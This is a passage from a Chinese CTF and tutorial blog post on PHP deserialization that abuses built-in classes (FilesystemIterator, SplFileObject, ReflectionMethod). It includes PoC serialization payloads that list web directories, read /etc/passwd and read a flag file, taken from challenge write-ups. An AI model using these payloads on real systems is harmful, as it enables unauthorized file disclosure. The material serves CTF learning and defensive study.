<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="comment">$a = new FilesystemIterator(&quot;/*&quot;);foreach($a as $f)&#123;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span></span><br></pre></td></tr></table></figure>
<p>前面都是读取文件目录，下面是可以读取文件内容</p>
<h4 id="可读取文件类"><a class="markdownIt-Anchor" href="#可读取文件类"></a> 可读取文件类</h4>
<h5 id="splfileobject-类"><a class="markdownIt-Anchor" href="#splfileobject-类"></a> SplFileObject 类</h5>
<p><a href="https://www.php.net/manual/zh/class.splfileobject.php">官方文档</a></p>
<p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作</p>
<p>测试：</p>
<p>读取文件的一行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure>
<p>对文件中的每一行内容进行遍历</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="极客大挑战-soezunser"><a class="markdownIt-Anchor" href="#极客大挑战-soezunser"></a> 极客大挑战-SoEzUnser</h5>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121664208">博客推荐</a></p>
<h5 id="2021-mar-dasctf-明御攻防赛ez_serialize"><a class="markdownIt-Anchor" href="#2021-mar-dasctf-明御攻防赛ez_serialize"></a> [2021 MAR DASCTF 明御攻防赛]ez_serialize</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">B</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;<span class="title">ctfer</span>&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">new</span>  $<span class="title">this</span>-&gt;<span class="title">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__wakeup</span>()    // 可以直接绕过<span class="title">__wakeup</span>()方法的执行</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;para) &amp;&amp; <span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">else</span></span></span><br><span class="line"><span class="class">            <span class="title">die</span>(&#x27;<span class="title">bad</span> <span class="title">hacker</span>~&#x27;);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是一样的，先代码审计，发现没有什么危险函数的利用，我们可以利用原生类来利用了</p>
<p>首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE：</p>
<p>然后进入这个文件夹</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>看到flag.php</p>
<p>现在我们只需要读取文件内容，利用<code>SplFileObject类</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;SplFileObject&#x27;</span>;    </span><br><span class="line">    <span class="comment">// SplFileObject(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure>
<p>能否利用原生类读取文件内容和文件目录？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo new  $this-&gt;class ($this-&gt;para)</span><br></pre></td></tr></table></figure>
<p>这行代码比较关键，就是能否利用原生类的关键</p>
<h4 id="使用-reflectionmethod-类获取类方法的相关信息"><a class="markdownIt-Anchor" href="#使用-reflectionmethod-类获取类方法的相关信息"></a> 使用 ReflectionMethod 类获取类方法的相关信息</h4>
<h5 id="reflectionmethod"><a class="markdownIt-Anchor" href="#reflectionmethod"></a> ReflectionMethod</h5>
<p><strong>ReflectionMethod</strong> 类报告了一个方法的有关信息。可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReflectionMethod</span> <span class="keyword">extends</span> <span class="title">ReflectionFunctionAbstract</span> <span class="keyword">implements</span> <span class="title">Reflector</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    	</span><br><span class="line"><span class="comment">/*方法*/</span></span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__construct</span> — ReflectionMethod 的构造函数</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">export</span> — 输出一个回调方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getClosure</span> — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getDeclaringClass</span> — 获取被反射的方法所在类的反射实例</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getModifiers</span> — 获取方法的修饰符</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getPrototype</span> — 返回方法原型 (如果存在)</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">invoke</span> — Invoke</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">invokeArgs</span> — 带参数执行</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isAbstract</span> — 判断方法是否是抽象方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isConstructor</span> — 判断方法是否是构造方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isDestructor</span> — 判断方法是否是析构方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isFinal</span> — 判断方法是否定义 <span class="keyword">final</span></span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isPrivate</span> — 判断方法是否是私有方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isProtected</span> — 判断方法是否是保护方法 (<span class="keyword">protected</span>)</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isPublic</span> — 判断方法是否是公开方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isStatic</span> — 判断方法是否是静态方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">setAccessible</span> — 设置方法是否访问</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span> — 返回反射方法对象的字符串表达</span><br><span class="line">        </span><br><span class="line"><span class="comment">/*继承的方法*/</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">__clone</span>(): <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getAttributes</span>(?<span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getClosureScopeClass</span>(): ?ReflectionClass</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getClosureThis</span>(): <span class="keyword">object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getDocComment</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getEndLine</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getExtension</span>(): ReflectionExtension</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getExtensionName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getFileName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNamespaceName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNumberOfParameters</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNumberOfRequiredParameters</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getParameters</span>(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getReturnType</span>(): ?ReflectionType</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getShortName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getStartLine</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getStaticVariables</span>(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">hasReturnType</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">inNamespace</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isClosure</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isDeprecated</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isGenerator</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isInternal</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isUserDefined</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isVariadic</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">returnsReference</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">__toString</span>(): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<p>ReflectionMethod 类中有很多继承方法可以使用，比如这个 <code>getDocComment()</code> 方法，我们可以用它来获取类中各个函数注释内容，如下图所示（借用下图）</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4bed8c444b5d6640cfde958fa1b83753-166727395787411.png" alt="image-20210516101052113"></p>
<h5 id="2021-ciscneasy_source"><a class="markdownIt-Anchor" href="#2021-ciscneasy_source"></a> [2021 CISCN]easy_source</h5>
<p>先看代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];    <span class="comment">// 传入原生类名</span></span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];    <span class="comment">// 传入类属性</span></span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];    <span class="comment">// 传入类属性</span></span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];    <span class="comment">// 传入类方法</span></span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);    <span class="comment">// 实例化刚才传入的原生类</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());     <span class="comment">// 调用类中的方法</span></span><br></pre></td></tr></table></figure>
<p>首先看到这两行代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure>
<p>类似于上面的题，需要利用原生类</p>
<p>这个题，我开始想到还是用<code>FilesystemIterator</code></p>
<p>如果得到文件路径，然后还是用<code>SplFileObject</code>来读取文件内容</p>
<p>但是这个考<code>ReflectionMethod</code></p>
<p>猜测flag在注释中</p>
<p>直接构造payload,即可得到flag</p>
